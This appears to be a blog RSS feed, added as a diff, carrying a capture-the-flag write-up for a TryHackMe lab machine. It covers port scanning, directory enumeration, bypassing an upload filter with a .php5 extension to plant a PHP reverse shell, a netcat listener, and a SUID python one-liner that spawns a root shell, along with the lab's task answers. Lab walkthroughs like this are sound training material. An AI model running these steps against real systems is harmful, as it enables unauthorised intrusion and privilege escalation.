@@ -1,0 +1,207 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>THM on SolarSpectre</title><link>https://solarspectre.github.io/tags/thm/</link><description>Recent content in THM on SolarSpectre</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 05 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://solarspectre.github.io/tags/thm/index.xml" rel="self" type="application/rss+xml"/><item><title>THM Root Me - Writeup</title><link>https://solarspectre.github.io/p/thm-root-me-writeup/</link><pubDate>Wed, 05 Mar 2025 00:00:00 +0000</pubDate><guid>https://solarspectre.github.io/p/thm-root-me-writeup/</guid><description>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/cover.png" alt="Featured image of post THM Root Me - Writeup" />&lt;p>Let&amp;rsquo;s start with a fast scan, i normally use rustscan to gather the open ports faster:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">rustscan --top -a &amp;lt;victim_ip&amp;gt; &lt;span class="p">|&lt;/span> tee initialScan.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/1.png"
+width="526"
+height="701"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_9c53525f83bf454b.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/1_hu_c333d88834b69866.png 1024w"
+loading="lazy"
+alt="Image 1"
+class="gallery-image"
+data-flex-grow="75"
+data-flex-basis="180px"
+>
+once it&amp;rsquo;s finished, i copy the open ports and scan them with nmap looking out for the versions of the services hosted in those ports&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl"> sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/2.png"
+width="647"
+height="411"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_d5498e0f5e48e977.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/2_hu_b1b043e898df6153.png 1024w"
+loading="lazy"
+alt="Image 2"
+class="gallery-image"
+data-flex-grow="157"
+data-flex-basis="377px"
+>
+Now, the scan shows that the machine is hosting a web server with Apache, we can take a look at the directories the website has with gobuster&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">gobuster dir -t &lt;span class="m">45&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://&amp;lt;ip&amp;gt;/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/3.png"
+width="662"
+height="412"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_58353679a81d8403.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/3_hu_9dd1b6fde54a44b9.png 1024w"
+loading="lazy"
+alt="Image 3"
+class="gallery-image"
+data-flex-grow="160"
+data-flex-basis="385px"
+>&lt;/p>
+&lt;h3 id="task-2">Task 2
+&lt;/h3>&lt;pre>&lt;code>How many ports are open? 2
+What version of Apache is running? 2.4.29
+What service is running on port 22? SSH
+What is the hidden directory? /panel/
+&lt;/code>&lt;/pre>
+&lt;h3 id="user-flag">User Flag
+&lt;/h3>&lt;p>Visiting the website shows us this
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/4.png"
+width="972"
+height="345"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_cc81225b523a90b0.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/4_hu_67f4a1f1d982539f.png 1024w"
+loading="lazy"
+alt="Image 4"
+class="gallery-image"
+data-flex-grow="281"
+data-flex-basis="676px"
+>
+and going to the /panel route shows a file upload page
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/5.png"
+width="1072"
+height="813"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_75fa1584ddc2e02f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/5_hu_a36a5ccacd0c767d.png 1024w"
+loading="lazy"
+alt="Image 5"
+class="gallery-image"
+data-flex-grow="131"
+data-flex-basis="316px"
+>
+There&amp;rsquo;s an arbitrary file upload vulnerability in this page, allowing us to upload a maliciously crafted php file that we can use to upload and execute a reverse shell, you can use this shell from pentestmonkey
+&lt;a class="link" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank" rel="noopener"
+>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&lt;/a>&lt;/p>
+&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/6.png"
+width="674"
+height="634"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_28dc4c913f1a2e6f.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/6_hu_306e548438f0d55d.png 1024w"
+loading="lazy"
+alt="Image 6"
+class="gallery-image"
+data-flex-grow="106"
+data-flex-basis="255px"
+>&lt;/p>
+&lt;p>But php is not allowed to be uploaded, we can bypass this validation changing the file extension to be php5&lt;/p>
+&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/7.png"
+width="613"
+height="603"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_6841a7345ed24010.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/7_hu_c1eeaf36a3415c35.png 1024w"
+loading="lazy"
+alt="Image 7"
+class="gallery-image"
+data-flex-grow="101"
+data-flex-basis="243px"
+>&lt;/p>
+&lt;p>Then start a listener with netcat:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4242&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>navigate to the route where your file is uploaded, for example: /uploads/shell.php5
+and you got the shell&lt;/p>
+&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/8.png"
+width="542"
+height="188"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_265562d5df2d7729.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/8_hu_c839516de95e6fca.png 1024w"
+loading="lazy"
+alt="Image 8"
+class="gallery-image"
+data-flex-grow="288"
+data-flex-basis="691px"
+>&lt;/p>
+&lt;p>Once obtained the shell, let&amp;rsquo;s find the flag and get it!&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">find / -name user.txt 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat /var/www/user.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="root-flag">Root Flag
+&lt;/h3>&lt;p>Find binaries with SUID permissions that allow users to execute the binary with the permissions of the owner of the file, rather than the user who runs the command (most of the times is root).&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">find / -perm -4000 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>And look at that, python? Let&amp;rsquo;s check what user is the owner of the binary&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ls -la /usr/bin/python
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rwsr-sr-x 1 root root 3665768 Aug 4 2020 /usr/bin/python
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Sweet! it&amp;rsquo;s root. You can use gtfobins to look for info about a binary you can possibly use to escalate privileges:
+&lt;a class="link" href="https://gtfobins.github.io/gtfobins/python/" target="_blank" rel="noopener"
+>https://gtfobins.github.io/gtfobins/python/&lt;/a>
+&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/10.png"
+width="833"
+height="247"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_67200d7dbc8eec37.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/10_hu_542ba0758df375d6.png 1024w"
+loading="lazy"
+alt="Image 9"
+class="gallery-image"
+data-flex-grow="337"
+data-flex-basis="809px"
+>
+we can execute a oneliner to spawn a shell as root and obtain the final flag&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">/usr/bin/python -c &lt;span class="s1">&amp;#39;import os; os.execl(&amp;#34;/bin/sh&amp;#34;,&amp;#34;sh&amp;#34;,&amp;#34;-p&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/thm-root-me-writeup/9.png"
+width="514"
+height="74"
+srcset="https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_dd7f58f0fc440341.png 480w, https://solarspectre.github.io/p/thm-root-me-writeup/9_hu_9c49c8e7a0df4b64.png 1024w"
+loading="lazy"
+alt="Image 10"
+class="gallery-image"
+data-flex-grow="694"
+data-flex-basis="1667px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">cat /root/root.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>and you got the root flag!!&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>This machine covers topics like Arbitrary File Uploads and exploiting binaries with SUID permissions to escalate privileges.&lt;/p>
+&lt;p>&lt;mark>Hope you enjoyed it and Happy Hacking!&lt;/mark>&lt;/p></description></item></channel></rss>
